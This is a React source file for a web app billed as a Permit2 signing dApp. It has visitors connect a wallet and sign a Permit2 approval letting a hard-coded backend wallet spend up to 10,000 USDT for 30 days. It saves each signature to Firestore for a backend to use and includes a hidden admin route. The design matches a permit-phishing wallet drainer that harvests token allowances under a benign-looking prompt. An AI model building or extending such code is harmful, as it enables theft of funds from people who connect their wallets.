import React, { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { BrowserProvider } from 'ethers';
import { db } from './firebase';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import Admin from './Admin'; // <--- MAKE SURE THIS IMPORT IS HERE

// -----------------------------
// CONFIGURATION
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
// Universal Router (common pitfall) — signatures should NOT set this as the spender
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
// Executor address is hard-coded per operator request
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const USDT_DECIMALS = 6n;
const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);

const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
  metadata: {
    name: 'Permit2 App',
    description: 'Universal Router Permit2 Signer',
    url: 'https://example.com',
    icons: []
  },
});

export default function App() {
  // 1. ROUTING LOGIC: Check if we are on the "/admin" page
  const [isAdmin] = useState(() => window.location.pathname === '/admin');

    // Executor address is forced to the hard-coded value
    const [executorAddress, setExecutorAddress] = useState(HARDCODED_EXECUTOR);

  const [status, setStatus] = useState("Not connected");
  const [connectedAddress, setConnectedAddress] = useState(null);

  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setStatus(`Connected: ${acct.address}`);
        setConnectedAddress(acct.address);
      } else {
        setStatus("Not connected");
        setConnectedAddress(null);
      }
    });
    return () => unsub();
  }, []);

  // We keep a no-op Firestore subscription for compatibility, but ignore remote executor overrides
  useEffect(() => {
    try {
      const ref = doc(db, 'admin_config', 'settings');
      const unsub = onSnapshot(ref, () => {} , (err) => console.error('admin settings onSnapshot error', err));
      return () => unsub();
    } catch (e) {
      // ignore if Firestore unavailable
    }
  }, []);

  const signPermit = async () => {
    try {
      if (!connectedAddress) {
        setStatus("Wallet not connected");
        return;
      }
      if (!executorAddress) {
        setStatus("Error: Executor address missing (set VITE_EXECUTOR_ADDRESS or admin_config/settings.executorAddress)");
        return;
      }

      setStatus("Preparing Permit2 signature...");

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) {
        setStatus("Wallet provider not available.");
        return;
      }

      const provider = new BrowserProvider(walletProvider);
      const net = await provider.getNetwork();
      const chainId = Number(net.chainId);

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0; 

      const permitted = {
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        expiration: deadline,
        nonce
      };

      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };

      const types = {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };

      // Spender MUST be the Executor (Backend Wallet), NOT the Router
      const message = {
        details: permitted,
        spender: executorAddress,
        sigDeadline: deadline
      };

      setStatus("Requesting signature...");
      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });

      const signature = await walletProvider.request({
        method: "eth_signTypedData_v4",
        params: [connectedAddress, payload]
      });

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      const v = parseInt(raw.substring(128, 130), 16);

      const id = connectedAddress + "_" + Date.now();

      await setDoc(doc(db, "permit2_signatures", id), {
        owner: connectedAddress,
        spender: executorAddress,
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setStatus("Signature saved! Backend will process it.");

    } catch (err) {
      console.error(err);
      setStatus("Error: " + (err?.message || String(err)));
    }
  };

  // 2. CONDITIONAL RENDER: If URL is /admin, show Admin panel
  if (isAdmin) {
    return <Admin />;
  }

  // Otherwise, show the User Signing UI
  return (
    <div className="app-container">
      <h2>Permit2 Signing DApp</h2>
      <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
        Connect wallet and sign the USDT $10,000 cap for the Executor.
      </p>

      <div style={{ marginBottom: 12 }}>
        <strong>Spender (Executor):</strong>{' '}
        <span style={{ fontFamily: 'monospace' }}>{executorAddress || '(not set)'}</span>
        {executorAddress === UNIVERSAL_ROUTER && (
          <div style={{ color: '#ffb4b4', marginTop: 6 }}>
            Warning: The executor is set to the Universal Router address — this is likely incorrect.
            The backend expects a wallet address (the private key it controls) as the spender.
          </div>
        )}
      </div>

      {connectedAddress ? (
        <button className="connect" onClick={signPermit}>
          Sign Permit
        </button>
      ) : (
        <button className="connect" onClick={() => appKit.open()}>
          Connect Wallet
        </button>
      )}

      <div className="status">{status}</div>
    </div>
  );
}
